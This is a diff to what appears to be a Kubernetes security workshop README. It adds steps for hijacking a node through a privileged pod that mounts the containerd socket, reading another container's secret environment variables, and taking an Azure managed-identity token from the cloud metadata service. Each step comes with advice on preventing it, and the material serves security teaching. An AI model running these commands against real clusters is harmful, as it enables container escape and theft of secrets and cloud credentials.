@@ -58,6 +58,7 @@ Input for the app (change your IP):
 
 * Build secure/small container images ([distroless](https://github.com/GoogleContainerTools/distroless), less is more)
 * Deny egress network access on a network level as well as using [Kubernetes Network Policies](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
+* Detect untrusted process with container runtime security tools like [Falco](https://github.com/falcosecurity/falco)
 
 </details>
 
@@ -130,5 +131,189 @@ kubectl auth can-i create pod
 * Things we already talked about
   * Limit egress access to the internet
   * Use distroless and secure container images
+  * Detect untrusted processes with container runtime security
+
+</details>
+
+## Hijack the Kubernetes Node
+
+Let's try one more thing. Are we able to schedule a privileged pod and "talk" to containerd? Execute the following snippets:
+
+```bash
+cat <<EOF | kubectl apply -f -
+apiVersion: v1
+kind: Pod
+metadata:
+  name: privileged-pod
+  namespace: default
+spec:
+  containers:
+  - name: shell
+    image: ubuntu:latest
+    stdin: true
+    tty: true
+    volumeMounts:
+    - mountPath: /mnt
+      name: volume
+    securityContext:
+      privileged: true
+  volumes:
+  - name: volume
+    hostPath:
+      path: /run/containerd
+EOF
+
+kubectl exec -it -n default privileged-pod /bin/bash
+
+apt-get update; apt-get install -y curl jq
+
+curl -LO https://github.com/containerd/containerd/releases/download/v1.5.5/cri-containerd-cni-1.5.5-linux-amd64.tar.gz; tar -xvf cri-containerd-cni-1.5.5-linux-amd64.tar.gz
+
+ctr --address /mnt/containerd.sock --namespace k8s.io container list
+
+```
+
+<details>
+<summary>Details on how to hijack the node</summary>
+
+Let's try to schedule a priviledged pod and try to "talk" to containerd:
+
+```bash
+cat <<EOF | kubectl apply -f -
+apiVersion: v1
+kind: Pod
+metadata:
+  name: privileged-pod
+  namespace: default
+spec:
+  containers:
+  - name: shell
+    image: ubuntu:latest
+    stdin: true
+    tty: true
+    volumeMounts:
+    - mountPath: /mnt
+      name: volume
+    securityContext:
+      privileged: true
+  volumes:
+  - name: volume
+    hostPath:
+      path: /run/containerd
+EOF
+```
+
+Then we need to attach to the pod:
+
+```bash
+kubectl exec -it -n default privileged-pod /bin/bash
+```
+
+Now we can try to install some basics as well as the containerd CLI and talk to the containerd socket:
+
+```bash
+apt-get update; apt-get install -y curl jq
+
+curl -LO https://github.com/containerd/containerd/releases/download/v1.5.5/cri-containerd-cni-1.5.5-linux-amd64.tar.gz; tar -xvf cri-containerd-cni-1.5.5-linux-amd64.tar.gz
+
+ctr --address /mnt/containerd.sock --namespace k8s.io container list
+```
+
+</details>
+
+<details>
+<summary>How to prevent this attack</summary>
+
+* Things we already talked about
+  * Deny priviledged containers, host path mounts and other security related settings via Policies
+  * Do not share service accounts
+  * Limit egress access to the internet
+  * Use distroless and secure container images
+  * Detect untrusted processes with container runtime security
+
+</details>
+
+---
+
+## Access secrets from another container
+
+We will now try to retrieve secrets from a container we do not have access to (via Kubernetes):
+
+```bash
+id=$(ctr --address /mnt/containerd.sock --namespace k8s.io container list | grep "13f21f8cb8c85084bc9a3ddf98ecae31de1e5255363bd3a9c9ed50528106676c" | awk '{print $1}')
+
+ctr --address /mnt/containerd.sock --namespace k8s.io container info $id | jq .Spec.process.env
+```
+
+<details>
+<summary>Details on how to access the secrets</summary>
+
+We will use the containerd cli to access details of a container running on this nodes.
+
+First we will retrieve the container ID:
+
+```bash
+id=$(ctr --address /mnt/containerd.sock --namespace k8s.io container list | grep "13f21f8cb8c85084bc9a3ddf98ecae31de1e5255363bd3a9c9ed50528106676c" | awk '{print $1}')
+```
+
+And then request container runtime details like environemnt variables:
+```bash
+ctr --address /mnt/containerd.sock --namespace k8s.io container info $id | jq .Spec.process.env
+```
+
+We could now use the database connection secret to access the database.
+
+</details>
+
+<details>
+<summary>How to prevent this attack</summary>
+
+* Things we already talked about
+  * Deny priviledged containers, host path mounts and other security related settings via Policies
+  * Limit egress access to other cloud resources
+  * Use distroless and secure container images
+  * Detect untrusted processes with container runtime security
+
+</details>
+
+## Hijack Cloud resources
+
+We can also use the underlying cloud identity and try to escape even further. Execute the following snippet to get a valid Cloud provider token:
+
+```bash
+mount $(df | awk '{print $1}' | grep "/dev/sd") /tmp
+
+IDENTITY=$(cat /tmp/etc/kubernetes/azure.json | jq -r .userAssignedIdentityID)
+
+TOKEN=$(curl 'http://169.254.169.254/metadata/identity/oauth2/token?client_id='$IDENTITY'&api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' -H Metadata:true -s | jq -r .access_token)
+```
+
+<details>
+<summary>Details on how to retrieve a Cloud provider token</summary>
+
+First of all we need to mount the local node filesystem to access underlying identity id:
+
+```bash
+mount $(df | awk '{print $1}' | grep "/dev/sd") /tmp
+```
+
+We now can retrieve the used Cloud identity and request a valid token using the Cloud metadata service:
+
+```bash
+IDENTITY=$(cat /tmp/etc/kubernetes/azure.json | jq -r .userAssignedIdentityID)
+
+TOKEN=$(curl 'http://169.254.169.254/metadata/identity/oauth2/token?client_id='$IDENTITY'&api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' -H Metadata:true -s | jq -r .access_token)
+```
+
+</details>
+
+<details>
+<summary>How to prevent this attack</summary>
+
+* Deny access to the Cloud provider metadata service using Network Policies (all Cloud providers!)
+* Things we already talked about
+  * Deny priviledged containers, host path mounts and other security related settings via Policies
+  * Use distroless and secure container images
+  * Detect untrusted processes with container runtime security
 
 </details>
